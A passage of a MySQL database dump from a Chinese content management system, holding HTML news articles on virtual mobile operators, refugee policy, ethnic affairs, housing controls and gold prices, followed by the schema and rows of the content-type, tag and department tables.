style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">徐伟表示，正式开源后，下一步的目标是进一步完善平台的易用性和性能，并增强与开发者群体的沟通，了解他们的需求。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">在谈到人工智能行业的发展时，他认为，人工智能行业这两年出现爆发式增长，主要在语音识别、图像识别等领域出现了显著的突破。在谈到人工智能未来发展时，他表示乐观，并认为，未来可能的突破点在于自然语言识别、理解和处理以及机器翻译等方面，另外基于人工智能的”人工助手”的智能化程度也有望进一步加强。</p><p><br/></p>',NULL,NULL,NULL),(112,'<p style=\"text-align: center;\"><img src=\"/u/cms/www/201610/10114715p0as.jpg\" title=\"138679801.jpg\" alt=\"138679801.jpg\"/></p><p><br/></p><p style=\"text-indent: 2em;\">自2013年12月首批企业获牌以来，虚拟运营商发展迅速，目前已有42家企业获得牌照。9月22日，在“ICT中国· 2016高层论坛”移动转售分论坛上，中国通信企业协会披露，目前移动转售业务用户数已超3500万，占全国移动用户人数2.67%。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">不过，移动转售行业也因实名制未落实到位出现诸多“乱象”，尤其“170”号段诈骗多发遭诟病，在“徐玉玉受骗致死”案等多个热点事件的舆论声讨中，虚拟运营商声誉受到重大打击，其融资也受到影响。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\"><strong>虚拟运营商“很受伤”</strong></p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">3年前，第一批企业获得牌照进入试点，中国移动(微博)虚拟运营业方缓缓起步，而经过几年的发展，这一行业已小有规模，不过“成长的烦恼”也使其备受困扰。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">中国通信企业协会披露的数据显示，移动转售业的发展速度有所下降。自2015年3月起，移动通信转售业务月净增超过100万户，其中2015年10月起连续6个月净增达到200万，然而自2016年1月以来，增速有所放缓，甚至出现“停滞”。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">增速降低与行业乱象不无关联。女大学生徐玉玉被骗后昏聩致死使得社会的目光投向虚拟运营商，尤其是因为“实名制”再次被推上风口浪尖。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">据央广网2016年8月报道，工信部网络安全管理局对虚拟运营商新入网电话用户实名登记工作暗访，暗访的26家转售企业的109个营销网点中，37个网点存在违规行为，违规占比超三成。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">虚拟运营商“实名制”漏洞也成了舆论谴责的“靶子”。中兴视通显然备受折磨，其CEO邓慕超向与会者“倒苦水”，称自己有时“夜不能寐、梦不能求”。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">巴士在线CEO王献蜀在业内摸爬滚打多年，也叫苦不迭，“170贴了一个标签，就是诈骗，虚商也变成了诈骗公司。”王献蜀表示，这让虚拟运营商要“很受伤”，并呼吁业内外应给予虚拟运营商“容错空间”。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\"><strong>声誉受损融资受波及</strong></p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">中国虚拟运营业起步晚于发达国家，而虚拟运营商们盈利困难早已不是新闻，而今，命途多舛的它们又遇“拦路虎”，这也让资本市场对其发展前景打了个问号，虚拟运营商直接受到冲击。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">王献蜀称，“170”号段的问题影响了虚拟运营的融资。“我们很少听到说哪一家虚商拿了多少融资，然后怎么样，多么风光，虚商这个行业几乎都是每一家虚商，每一个老板，每一个企业真金白银自己从口袋里面往外掏钱。”王献蜀表示，从业几年来，他自己已经投入了1.8亿元。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">蜗牛移动CEO陈艳也深有体会，在她看来，虚拟运营商还是个“婴儿”，她表示，英国发展虚拟运营已有18年，虚拟运营的比例占到全行业的12%，而中国发展2、3年达到2.67%，未来还有很大发展空间，但她却感受到了行业内的恐慌。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">融资困境及舆论压力促进了虚拟运营商的反思。9月22日的论坛上，虚拟运营企业代表均坦承，虚拟运营商也是诈骗案的受害者，落实实名制可促使虚拟运营业健康发展。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">今年4月份，工信部发布了《关于加强规范管理，促进移动通信转售业务健康发展》的通知，向移动转售企业提出了落实移动用户实名登记要求的有关具体规定。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">据中国通信企业协会常务副会长兼秘书长苗建华介绍，整治以来，虚拟运营商采用系统整改、完善手段、有奖举报等一系列措施取得了一定的成效。</p><p><br/></p>',NULL,NULL,NULL),(113,'<p style=\"text-align: center;\"><img src=\"/u/cms/www/201610/10114919rtom.jpg\" title=\"641.jpg\" alt=\"641.jpg\"/></p><p><br/></p><p style=\"text-indent: 2em;\">李克强总理首赴联合国，首场活动便是出席由联合国倡议举行的联大解决难移民大规模流动问题高级别会议。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">这是自联合国成立以来，首次召开的应对难移民问题的高级别会议。同时尤其值得注意的是，这也是中国领导人首次在此种国际场合阐述对于难移民问题的主张。总理的首场与联合国的首次，两者碰撞出怎样的火花?</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">人道主义的价值观，这是李克强主张的要旨。在联合国的讲台上，中国总理的视野超越国别和地域。他将难民和移民问题视为一场“拷问人类社会良知”的人道主义危机，因此郑重向国际社会发出呼吁：“每一个人的生命都是宝贵的，每一个人的尊严都应得到维护，人道主义精神必须弘扬。”中国传统政治伦理中有着人道主义的丰沛思想资源，李克强将其带到联合国讲台上，从而丰富了中国当代外交与政治的实践。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">与此相应，在联合国这个庄严的讲台上，李克强代表中国宣布的3项举措，实打实地彰显了基于人道主义的国际政治理念。中国将这样做：在原有援助规模的基础上，向有关国家和国际组织提供1亿美元的人道主义援助;积极研究把中国-联合国和平与发展基金的部分资金用于支持发展中国家难民移民工作;积极探讨同有关国际机构和发展中国家开展三方合作。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">怎么做，真金白银，某种意义上比怎么说更触及实质。然而这里面有一个厘清“责任观”的问题。中国作为联合国常任理事国，在难移民这一全球性议题上当然有义不容辞的责任。该出手时就出手，正如李克强在当天会议上所言，中国把人道主义援助视为“道义之举”。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">同时，中国经济虽有了很大发展，但仍是发展中国家，愿意承担与自身能力相适应的责任。李克强在联合国所承诺的援助资金，是中国的量力而为，我们决不放空炮;所承诺的援助方式，比如使用和平与发展基金的部分资金、开展三方合作等，也是真正的“务实之举”。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">更关键的是，李克强的“说”与“做”，在一个更高层面上实现了统一，那就是发展。战乱冲突、贫穷落后是难移民问题的主要根源，实现真正的包容性增长方为治本之策。中国的主张和举措，牢牢把握住了解决问题最关键点——长远和根本地看，出路还蕴藏在发展这一主题中。这也是李克强一直以来在国际外交舞台上所强调的，以发展弥合伤痕、促进平衡、共同向前。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">在联合国的首场活动，阐述理念、承诺硬招，李克强总理在这个最高的国际场合，展示了中国“软实力”。</p><p><br/></p>',NULL,NULL,NULL),(130,'<p style=\"text-indent: 2em;\">细心的人会观察到，在发表2016年新年贺词的镜头中，习近平总书记办公室有了新变化：新添的7张照片中，有3张记录着总书记和民族地区各族干部群众一起谋发展、话小康的难忘瞬间。</p><p style=\"text-indent: 2em;\"><br/></p><p>　　民族工作关乎大局。党的十八大以来，以习近平同志为总书记的党中央高度重视民族工作，多次深入民族地区调研，体察少数民族群众冷暖。先后召开第二次中央新疆工作座谈会、中央民族工作会议、中央第六次西藏工作座谈会等，对民族工作作出全面部署，力度之大、频次之高、涉面之广、阐述之深，前所未有，一曲新形势下民族工作新乐章在中华大地奏响。</p><p><br/></p><p>　　保持定力：坚持走中国特色解决民族问题的正确道路</p><p><br/></p><p>　　2014年9月，中央民族工作会议在京召开。会上，习近平总书记在坚持党的民族理论政策基本原则的基础上，提出了一系列新思想新观点新举措，为新形势下民族工作提供了行动指南和基本遵循：</p><p><br/></p><p>　　——我国历史演进的这个特点，造就了我国各民族在分布上的交错杂居、文化上的兼收并蓄、经济上的相互依存、情感上的相互亲近，形成了你中有我、我中有你、谁也离不开谁的多元一体格局。</p><p><br/></p><p>　　——新中国成立65年来，党的民族理论和方针政策是正确的，中国特色解决民族问题的道路是正确的，我国民族关系总体是和谐的。</p><p><br/></p><p>　　——同世界上其他国家相比，我国民族工作做得都是最成功的。</p><p><br/></p><p>　　——中华民族和各民族的关系，形象地说，是一个大家庭和家庭成员的关系，各民族的关系是一个大家庭里不同成员的关系。</p><p><br/></p><p>　　——坚持中国特色解决民族问题的正确道路。</p><p><br/></p><p>　　——坚持和完善民族区域自治制度，要做到坚持统一和自治相结合，坚持民族因素和区域因素相结合。</p><p><br/></p><p>　　——做好民族工作，最关键的是搞好民族团结，最管用的是争取人心。</p><p><br/></p><p>　　——城市民族工作要把着力点放在社区，推动建立相互嵌入式的社会结构和社区环境。</p><p><br/></p><p>　　——加强中华民族大团结，长远和根本的是增强文化认同，建设各民族共有精神家园，积极培养中华民族共同体意识。</p><p><br/></p><p>　　——尊重差异、包容多样，通过扩大交往交流交融，创造各族群众共居、共学、共事、共乐的社会条件，让各民族在中华民族大家庭中手足相亲、守望相助。</p><p>　　……</p><p>　　中央民族工作会议的召开，统一思想、坚定信心，在新的历史起点上推动民族团结进步事业踏上新的时代征程。</p><p><br/></p><p>　　大政方针已定，关键就在落实。中央民族工作会议以来，以理论创新为先导，民族工作的政策创新、制度创新、实践创新不断推进。</p><p><br/></p><p>　　——出台贯彻落实《中共中央、国务院关于加强和改进新形势下民族工作的意见》的重要举措分工方案，包括16项47条，条条都是硬举措。相关部委组成联合督查组督促中央民族工作会议精神的贯彻落实。</p><p><br/></p><p>　　——时隔13年召开全国民族教育工作会议，首次召开全国城市民族工作会议……中央民族工作会议精神逐一贯彻，渐次落实。</p><p><br/></p><p>　　——全国31个省、自治区、直辖市和新疆生产建设兵团相继召开贯彻落实中央民族工作会议精神的会议，出台了相关配套文件。</p><p><br/></p><p>　　——为支持民族地区加快发展，输送“真金白银”，研究制定差别化政策：第一次对川甘青交界地区，对南疆四地州，对怒江、凉山、临夏等三个特困自治州，专门制定政策举措。</p><p><br/></p><p>　　——明确少数民族学生高考加分政策，对国家通用语言文字已经普及、教育水平大体相同的地区，逐步缩小差距，逐步做到一律平等；对语言文化差异较大、教育质量还不高的一些地区少数民族学生，除大力普及双语教育、调整专业设置、提高教学质量外，仍是实行高考加分政策，支持少数民族学生取得较好教育水平。</p><p><br/></p><p>　　两年来，中央民族工作会议精神在各地生根发芽、开花结果。</p><p><br/></p>',NULL,NULL,NULL),(131,'<p style=\"text-align: center;\"><img src=\"/u/cms/www/201610/101353469a1k.jpg\" title=\"3c6d55fbb2fb43161e70f38528a4462308f7d3e6.jpg\" alt=\"3c6d55fbb2fb43161e70f38528a4462308f7d3e6.jpg\"/></p><p><br/></p><p style=\"text-indent: 2em;\">今年的国庆节注定是个不平凡的节日，北京、广州、深圳、苏州、合肥等20个一二线城市相继出台楼市限购限贷政策，“深八条”、“沪六条”等严厉调控措施相继出笼，犹豫在中国大地上引爆了无数颗原子弹，看得人眼花缭乱、心惊肉跳，让人感受到了中国楼市调控“变脸术”之快、之严。&nbsp;</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">社会各界姑且会猜测，这些调控措施付诸实施之后能否成为医治楼市癫狂的灵丹妙药？房地产业服了这些调控药之后是否能走上理性、健康发展轨道？中国民众是否从此不再有楼市猛涨带来的恐慌之虞？回答无疑是否定的。因为这些调控之“药”依然没有摆脱行政窠臼，其结局也就很难跳出行政调控怪圈：“严格管制房价暂时趋缓—放松管制房价暴涨”。也就是说，出台调控措施的这些城市，楼市价格上涨趋势可能暂时会缓一缓，但过后可能又将迎来新一轮量价齐涨周期。因为中国从2005年3月底的“国八条”算起，短短十年间，中国房地产市场虽经历过无数次调控，无论是国务院的各项“通知”，还是九部委、七部委的各种“意见”，都没能阻挡住房价上涨的步伐；不少城市的房价比2005年翻了几番甚至十番都不止。每一轮调控政策都是为稳定住房价格，但调控过后，总有一轮快速上涨行情，越让普通百姓感叹房子越来越买不起了。显然，目前楼市调控实质已陷入越调越高和政府“助涨”的尴尬局面。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">这是为什么呢？道理其实很简单，因为我们楼市调控政策存在严重问题：一是没有理顺楼市调控的目的到底是什么，是控制住房价让老百姓买得起房，还是不要过于严厉让房地产开发商能有钱赚和地方财政有收入可进？正因为楼市调控政策总是处于摇摆不定状态，忽而严厉、忽而放松，缺乏长久可持续调控政策措施，让房地产开发商及各级地方政府形成了“耐药性”，使调控功效被抵消。二是没有割断地方政府与房地产业发展之间的各种利益关系，是让楼市调控步入市场运行机制、让市场充分发挥自发调节作用，还是继续伸出行政权力之手来生硬地管制房价或分割利益？由于这种利益关系没理顺，使一些地方政府难下决心认真调控，致使调控政策得不到认真落实走形变样；同时也会更加诱发一些地方政府竭力追求土地财政、推高房价获得足够收入搞高楼房、宽马路等城市形象政绩工程建设，使调控陷入了“死胡同”。三是没有足够底牌或也不愿意拿出有效手段来对冲楼市上涨带来的压力，使楼市调控政策软弱无力。比如保障房、经济适用房等建设速度缓慢、数量严重短缺，把一大批城市中低收入人群也逼向商品房购买行列，更加剧了楼市非理性上涨；也让政府对楼市非正常上涨现象缺乏必要平抑措施，只能望楼市价格上涨兴叹。四是对楼市上涨失控城市政府调控不力、楼市中存在各种违规行为及投机炒作行为缺乏必要法治惩治手段，使楼市失常状况难得到及时扭转。如调控政策出台之后，没有一个地方政府领导因楼市调控措施落实不力受到严肃问责，丢下官帽；没有一个开发商因弄虚作假、违规开发而被罚得倾家荡产；更没有一个楼市投机炒作者被追究刑责入狱。于是地方政府调控措施执行不力已司空见惯，开发商违规行为让人熟视无睹，投机商哄抬房价打乱楼市现象更是让人见怪不怪。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">由此，目前中国一二线城市楼市调控政策不能只求一时轰动效应，而应把追求实实在在的长久调控效果放在首位，推动楼市调控彻底走出“屡涨屡调，屡调屡涨”怪圈：首先，制定富有弹性的楼市调控政策，确立楼市调控近期目标、中期目标和长远目标，分阶段实施，消除狂风暴雨式调控模式；把楼市调控政策制定要交给各级地方政府，建立目标考核责任制，将其纳入施政目标，让民众来打分评价，对民众不满意或房价涨幅过大的地方政府领导实施行政降级、行政记过、诫勉谈话等问责处罚，增强楼市调控政策的严肃性。其次，进一步厘清行政干预与市场调节的界限，确立地方政府在房地产市场中的责任；将房地产市场纳入法治监管轨道，对楼市调控不力的地方政府、违法违规的房地产开发及哄抬房价扰乱楼市秩序的投机商追究刑事责任，增强楼市调控的法治威慑力。再次，应尽快终结土地财政，加快税收制度改革步伐，将中央政府与地方政府事权与财权改革到位，消除地方政府对土地财政的依赖，楼市疯狂暴涨和挤泡沫才真正有希望。</p><p><br/></p>',NULL,NULL,NULL),(132,'<p style=\"text-align: center;\"><img src=\"/u/cms/www/201610/10135526bcqb.jpg\" title=\"908fa0ec08fa513da2f6fc21356d55fbb3fbd9f5.jpg\" alt=\"908fa0ec08fa513da2f6fc21356d55fbb3fbd9f5.jpg\"/></p><p><br/></p><p style=\"text-indent: 2em;\">三年前，中国大妈们抢购黄金的记忆还历历在目，没想到如今的黄金又开始了一轮又一轮的下跌。接连的破位下跌，再次有人开始蠢蠢欲动，想着投资抄底，再加上中国房地产市场的调控力度不断加大，那么会不会有一部分投资热钱也会进入到黄金市场呢？其实，投资市场历来有句名言是买涨不买跌。不过，对于黄金这种相对常见的避险投资工具来说，很多人买了就是资产配置和“囤货”，并不是简单的投资或者快速的出手，她们持有的耐心和时间更长，因此任何一个低价的出现，都有可能成为触发市场投资的一种诱惑。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">连续下跌，何时是个头？</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">今年的“十一黄金周”期间，黄金价格已经跌破1,300美元/盎司的重要支撑。10月1日～7日，纽约商业交易所（COMEX）黄金大跌4.5%，创下一年来最大单周跌幅，其中上周二跌幅超过3.3%，也创下了2013年12月以来单日最大跌幅。10月4日，现货金价一度跌破1270美元/盎司关口，白银一度跌破18美元关口，跌幅超过5%，多次刷新英国脱欧公投以来最低。市场对欧佩克限产协议不断炒作，原油看涨情绪升温。这都使黄金的价格不被看好。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">市场对全球央行货币政策转向，担忧流动性逆转是黄金下跌的主要原因。其实在8月份之后，全球资本市场人士普遍猜测，各国将统一行动，主要在结构性改革、财政政策上发力，货币政策可能接近极限，全球的流动性将很快出现逆转。黄金价格的剧烈波动，就是对这一猜测的又一次市场反应。如果全球货币宽松走到尽头，那么利率将缓慢上升，全球的债券牛市也将终结。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">摩根大通统计的数据显示，今年英国退欧公投后，欧英日三大央行的季度资产购买规模连创新高。目前美欧英日四大央行的资产负债表已高达13万亿美元之巨，已占全球GDP的40%。预计在今年最后一个季度，欧英日三大央行将“加印”5060亿美元在市场上购买资产，创2009年美联储首推QE以来的最大季度规模。高盛表示，基于全球经济增长仍面临持续下行风险，同时市场可能仍在质疑货币政策应对任何经济潜在冲击的能力。因此，金价跌破每盎司1250美元可能是一个战略性的购买机会。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">值得关注的是，中国央行一直是购买黄金的主力。最新数据显示，截至9月末，国内黄金储备从2014年6月的1054.1吨大幅增加74%至1838.53吨。据中国黄金协会报导，2015年中国生产黄金515.88吨，黄金产量连续九年保持世界第一，黄金消费量连续三年保持世界第一。今年有望继续保持这一势头。不过，今年的黄金需求较往年有明显的回落。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">来自Wind数据统计显示，目前，共有4家拥有黄金业务的上市公司发布了公司的前三季度业绩预报，而从预报结果来看，金价的变化，让这些公司的投资者暂时松了口气。“预计前三季度归属于上市公司股东的净利润变动幅度为增长350.00%至400.00%；同期归属于上市公司股东的净利润变动区间为9847.85万元至10942.05万元；业绩变动的原因是成本下降，黄金价格上升。”</p><p><br/></p>',NULL,NULL,NULL),(140,'<p>任职资格:<br/>1、大专及以上学历，计算机相关专业<br/>2、有一年及以上Java或者安卓开发经验者优先考虑<br/>3、有责任心，能独立思考问题</p>',NULL,NULL,NULL);
/*!40000 ALTER TABLE `jc_content_txt` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `jc_content_type`
--

DROP TABLE IF EXISTS `jc_content_type`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `jc_content_type` (
  `type_id` int(11) NOT NULL,
  `type_name` varchar(20) NOT NULL COMMENT '名称',
  `img_width` int(11) DEFAULT NULL COMMENT '图片宽',
  `img_height` int(11) DEFAULT NULL COMMENT '图片高',
  `has_image` tinyint(1) NOT NULL DEFAULT '0' COMMENT '是否有图片',
  `is_disabled` tinyint(1) NOT NULL DEFAULT '0' COMMENT '是否禁用',
  PRIMARY KEY (`type_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='CMS内容类型表';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `jc_content_type`
--

LOCK TABLES `jc_content_type` WRITE;
/*!40000 ALTER TABLE `jc_content_type` DISABLE KEYS */;
INSERT INTO `jc_content_type` VALUES (1,'普通',100,100,0,0),(2,'图文',510,288,1,0),(3,'焦点',280,200,1,0),(4,'头条',0,0,0,0);
/*!40000 ALTER TABLE `jc_content_type` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `jc_contenttag`
--

DROP TABLE IF EXISTS `jc_contenttag`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `jc_contenttag` (
  `content_id` int(11) NOT NULL,
  `tag_id` int(11) NOT NULL,
  `priority` int(11) NOT NULL,
  KEY `fk_jc_content_tag` (`tag_id`),
  KEY `fk_jc_tag_content` (`content_id`),
  CONSTRAINT `fk_jc_content_tag` FOREIGN KEY (`tag_id`) REFERENCES `jc_content_tag` (`tag_id`),
  CONSTRAINT `fk_jc_tag_content` FOREIGN KEY (`content_id`) REFERENCES `jc_content` (`content_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='CMS内容标签关联表';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `jc_contenttag`
--

LOCK TABLES `jc_contenttag` WRITE;
/*!40000 ALTER TABLE `jc_contenttag` DISABLE KEYS */;
INSERT INTO `jc_contenttag` VALUES (2,8,0),(2,9,1),(2,10,2),(2,11,3),(2,12,4),(2,13,5),(2,14,6),(2,15,7),(2,16,8),(2,17,9),(2,18,10),(2,19,11),(7,61,0),(7,62,1),(7,3,2),(7,63,3),(7,64,4),(7,65,5),(7,66,6),(7,67,7),(7,68,8),(12,102,0),(12,8,1),(12,9,2),(12,103,3),(12,104,4),(12,105,5),(12,107,6),(12,108,7),(12,109,8),(12,15,9),(12,110,10),(13,111,0),(13,112,1),(13,113,2),(13,71,3),(13,114,4),(13,115,5),(13,116,6),(13,117,7),(14,102,0),(14,118,1),(14,119,2),(14,120,3),(14,121,4),(14,122,5),(14,123,6),(14,124,7),(23,139,0),(23,140,1),(23,141,2),(23,142,3),(23,143,4),(23,144,5),(23,145,6),(27,149,0),(27,150,1),(27,102,2),(27,151,3),(27,152,4),(27,153,5),(27,154,6),(28,155,0),(28,156,1),(28,157,2),(28,158,3),(28,159,4),(28,160,5),(28,161,6),(28,162,7),(28,163,8),(29,164,0),(29,165,1),(29,166,2),(29,167,3),(29,168,4),(29,169,5),(29,170,6),(29,171,7),(29,172,8),(29,173,9),(29,174,10),(29,175,11),(30,176,0),(30,177,1),(30,178,2),(30,179,3),(30,180,4),(30,181,5),(30,182,6),(30,183,7),(30,184,8),(30,185,9),(30,186,10),(30,187,11),(30,188,12),(30,189,13),(33,199,0),(33,200,1),(33,201,2),(33,24,3),(33,202,4),(33,203,5),(33,204,6),(33,205,7),(33,206,8),(33,207,9),(33,208,10),(33,209,11),(33,210,12),(36,230,0),(36,231,1),(36,232,2),(36,233,3),(36,234,4),(36,235,5),(36,236,6),(36,235,7),(36,237,8),(36,238,9),(36,239,10),(36,240,11),(36,241,12),(36,242,13),(36,243,14),(36,244,15),(36,245,16),(36,246,17),(37,247,0),(37,248,1),(37,249,2),(37,250,3),(37,251,4),(37,252,5),(37,253,6),(37,254,7),(37,255,8),(37,256,9),(37,257,10),(37,258,11),(39,42,0),(39,271,1),(39,10,2),(39,272,3),(39,273,4),(39,274,5),(39,275,6),(39,276,7),(43,286,0),(43,287,1),(43,288,2),(44,289,0),(44,290,1),(44,291,2),(45,292,0),(45,293,1),(46,436,0),(47,436,0),(47,437,1),(47,298,2),(47,438,3),(48,436,0),(48,437,1),(48,298,2),(49,436,0),(49,298,1),(49,439,2),(50,436,0),(50,437,1),(51,298,0),(51,438,1),(53,322,0),(53,323,1),(53,324,2),(53,325,3),(53,326,4),(53,327,5),(53,328,6),(53,329,7),(55,340,0),(55,269,1),(55,341,2),(55,342,3),(57,351,0),(57,352,1),(57,353,2),(57,354,3),(57,355,4),(57,59,5),(57,356,6),(57,357,7),(57,358,8),(59,365,0),(59,366,1),(59,367,2),(59,368,3),(59,369,4),(59,370,5),(61,375,0),(61,376,1),(61,377,2),(61,378,3),(61,379,4),(63,388,0),(63,21,1),(63,389,2),(63,390,3),(63,391,4),(63,392,5),(63,393,6),(63,394,7),(63,395,8),(63,396,9),(48,438,3),(48,439,4),(47,439,4),(46,437,1),(46,298,2),(46,438,3),(46,439,4),(111,500,0),(111,212,1),(111,501,2),(111,502,3),(111,503,4),(111,212,5),(111,504,6),(111,505,7),(111,506,8),(111,507,9),(111,508,10),(112,509,0),(112,510,1),(112,511,2),(112,512,3),(112,513,4),(112,514,5),(112,515,6),(112,516,7),(112,517,8),(112,518,9),(113,519,0),(113,520,1),(113,521,2),(113,522,3),(113,523,4),(113,524,5),(113,525,6),(113,526,7),(113,527,8),(114,501,0),(114,528,1),(114,529,2),(114,530,3),(114,531,4),(114,532,5),(114,533,6),(114,534,7),(114,535,8),(114,536,9),(114,537,10),(115,42,0),(115,538,1),(115,537,2),(115,539,3),(115,540,4),(115,541,5),(115,542,6),(115,543,7),(115,544,8),(116,545,0),(116,546,1),(116,547,2),(116,548,3),(116,549,4),(116,550,5),(116,551,6),(116,552,7),(116,553,8),(116,59,9),(116,554,10),(117,555,0),(117,556,1),(117,3,2),(117,557,3),(117,558,4),(117,559,5),(117,560,6),(118,561,0),(118,562,1),(118,563,2),(118,564,3),(118,565,4),(118,566,5),(118,567,6),(118,568,7),(118,569,8),(118,570,9),(118,269,10),(118,571,11),(119,572,0),(119,21,1),(119,573,2),(119,574,3),(119,24,4),(119,575,5),(119,576,6),(119,577,7),(119,578,8),(119,579,9),(119,580,10),(120,581,0),(120,582,1),(120,583,2),(120,584,3),(120,585,4),(120,586,5),(120,587,6),(120,588,7),(120,589,8),(121,590,0),(121,398,1),(121,399,2),(121,591,3),(121,592,4),(121,593,5),(121,594,6),(121,398,7),(121,595,8),(121,596,9),(121,597,10),(121,598,11),(121,399,12),(121,599,13),(122,600,0),(122,601,1),(122,602,2),(122,603,3),(122,604,4),(122,414,5),(122,414,6),(122,567,7),(122,605,8),(122,606,9),(122,607,10),(122,608,11),(122,609,12),(123,610,0),(123,611,1),(123,612,2),(123,613,3),(123,614,4),(123,615,5),(123,616,6),(123,617,7),(123,618,8),(123,619,9),(123,620,10),(123,621,11),(123,622,12),(123,623,13),(124,519,0),(124,624,1),(124,155,2),(124,625,3),(124,626,4),(124,627,5),(124,628,6),(124,629,7),(124,630,8),(124,631,9),(124,632,10),(125,633,0),(125,634,1),(125,635,2),(125,636,3),(125,637,4),(125,638,5),(125,639,6),(125,640,7),(125,641,8),(126,642,0),(126,643,1),(126,644,2),(126,645,3),(126,646,4),(126,647,5),(127,648,0),(127,649,1),(127,650,2),(127,651,3),(128,652,0),(128,653,1),(128,345,2),(128,654,3),(128,655,4),(128,656,5),(128,345,6),(128,657,7),(128,658,8),(129,322,0),(129,628,1),(129,659,2),(129,660,3),(129,661,4),(129,662,5),(129,559,6),(129,663,7),(129,664,8),(129,546,9),(129,665,10),(129,666,11),(129,667,12),(130,668,0),(130,637,1),(130,669,2),(130,670,3),(130,671,4),(130,672,5),(130,641,6),(131,673,0),(131,674,1),(131,675,2),(131,676,3),(131,677,4),(131,678,5),(132,679,0),(132,680,1),(132,681,2),(132,682,3),(132,683,4),(132,684,5),(132,685,6),(140,298,0),(140,437,1),(140,438,2),(141,711,0),(141,712,1),(141,713,2),(141,714,3),(141,715,4);
/*!40000 ALTER TABLE `jc_contenttag` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `jc_department`
--

DROP TABLE IF EXISTS `jc_department`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `jc_department` (
  `depart_id` int(11) NOT NULL AUTO_INCREMENT,
  `depart_name` varchar(255) NOT NULL DEFAULT '' COMMENT '部门名称',
  `site_id` int(11) DEFAULT '0' COMMENT '站点',
  `priority` int(11) NOT NULL DEFAULT '1' COMMENT '排序',
  `weights` int(11) NOT NULL DEFAULT '1' COMMENT '权重(值越大，级别越高)',
  `parent_id` int(11) DEFAULT NULL COMMENT '父级部门ID',
  PRIMARY KEY (`depart_id`),
  KEY `fk_jc_department_site` (`site_id`),
  KEY `fk_jc_jc_department_parent` (`parent_id`),
  CONSTRAINT `fk_jc_jc_department_parent` FOREIGN KEY (`parent_id`) REFERENCES `jc_department` (`depart_id`)
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=utf8 COMMENT='部门';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `jc_department`
--

LOCK TABLES `jc_department` WRITE;
/*!40000 ALTER TABLE `jc_department` DISABLE KEYS */;
INSERT INTO `jc_department` VALUES (1,'一级部门',NULL,1,1,NULL);
/*!40000 ALTER TABLE `jc_department` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `jc_dictionary`
--

DROP TABLE IF EXISTS `jc_dictionary`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `jc_dictionary` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `name` varchar(255) NOT NULL COMMENT 'name',
  `value` varchar(255) NOT NULL COMMENT 'value',
  `type` varchar(255) NOT NULL COMMENT 'type',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=12 DEFAULT CHARSET=utf8 COMMENT='字典表';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `jc_dictionary`
--

LOCK TABLES `jc_dictionary` WRITE;
/*!40000 ALTER TABLE `jc_dictionary` DISABLE KEYS */;
